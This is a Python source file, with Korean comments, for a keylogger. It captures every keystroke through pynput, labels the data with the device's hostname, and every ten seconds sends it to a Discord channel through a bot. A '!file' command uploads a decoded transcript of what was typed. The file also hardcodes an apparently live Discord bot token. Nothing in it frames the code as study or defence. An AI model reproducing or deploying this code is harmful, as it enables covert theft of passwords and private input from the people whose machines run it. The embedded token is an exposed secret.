import asyncio
import socket
from pynput import keyboard
import discord
import os
import random

input_data = []
send_data = []
counter = 1  # 숫자 카운터 초기화

bot_token = "MTI1MTE5MjU1NTc0NDI2NDI0Mw.GC3j7n.NsWvcg5heocxGVW4GnwfGSpsym4jdr8IbbX7wc"  # 봇 토큰을 여기에 넣어주세요
channel_id = 1338707319818551352  # 메시지를 보낼 채널 ID를 여기에 넣어주세요

def generate_random_color():
    return random.randint(0, 0xFFFFFF)  # 16진수 색상 값 (0x000000 ~ 0xFFFFFF)

main_color = generate_random_color()

# 기기 이름 가져오기
device_name = socket.gethostname()

intents = discord.Intents.default()
intents.members = True
intents.message_content = True

client = discord.Client(intents=intents)

# 키보드 입력 처리
def on_press(key):
    try:
        if key.char is not None:
            input_data.append(key.char)
            send_data.append(key.char)
    except AttributeError:
        input_data.append(str(key))
        send_data.append(str(key))

def decode_input_data(input_data):
    decoded_string = ""
    shift_pressed = False  # Shift 키가 눌렸는지 여부
    for key in input_data:
        if key == "Key.shift" or key == "Key.shift_r":
            shift_pressed = True
        elif key == "Key.backspace":
            decoded_string = decoded_string[:-1]  # 마지막 문자 삭제
        elif key == "Key.enter":
            decoded_string += "\n"  # 엔터는 줄 바꿈으로 처리
        elif key == "Key.ctrl_l":
            continue  # Ctrl 키는 무시
        else:
            if shift_pressed:
                decoded_string += key.upper()  # Shift가 눌렸으면 대문자
                shift_pressed = False  # Shift 키 해제
            else:
                decoded_string += key.lower()  # 소문자로 입력
    return decoded_string


# 메시지 전송 함수
async def send():
    global send_data, counter

    # 채널 가져오기
    channel = client.get_channel(channel_id)

    # 입력값을 보기 좋게 정리
    formatted_input = ", ".join(send_data)

    # 임베드 생성
    if send_data == []:
        formatted_input = " "
    embed = discord.Embed(title=f"{device_name} ({counter})", description=f"```{formatted_input}```\n-# 입력값은 10초마다 업데이트 됩니다!", color=main_color)
    embed.set_footer(text="by. anticord", icon_url="https://cdn.discordapp.com/avatars/1173182394422022237/c1ccd51447a567a8f9e3dbcffe89083c.webp?size=128")

    # 채널에 메시지 보내기
    await channel.send(embed=embed)

    send_data.clear()  # 전송 후 입력값 초기화
    counter += 1  # 숫자 카운터 증가

# 메시지 처리 함수
@client.event
async def on_message(message):
    if message.content.lower() == "!file":
        # input_data를 포멧하여 텍스트 파일로 변환
        formatted_input = ", ".join(input_data)
        embed_output = decode_input_data(input_data)
        file_name = f"{device_name}.txt"
        
        with open(file_name, "w") as f:
            f.write(formatted_input)
        
        # 파일을 첨부하여 전송
        with open(file_name, "rb") as f:
            embed = discord.Embed(title=f"{device_name}", description=f"파일이 성공적으로 보내졌습니다!\n```{embed_output}```", color=main_color)
            embed.set_footer(text="by. anticord", icon_url="https://cdn.discordapp.com/avatars/1173182394422022237/c1ccd51447a567a8f9e3dbcffe89083c.webp?size=128")
            await message.channel.send(embed=embed)
            await message.channel.send(file=discord.File(f, file_name))
        
        # 텍스트 파일 삭제 (옵션)
        os.remove(file_name)

# 비동기 루프
async def loop():
    while True:
        await send()
        await asyncio.sleep(10)

@client.event
async def on_ready():
    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    await loop()

# 봇 로그인
client.run(bot_token)
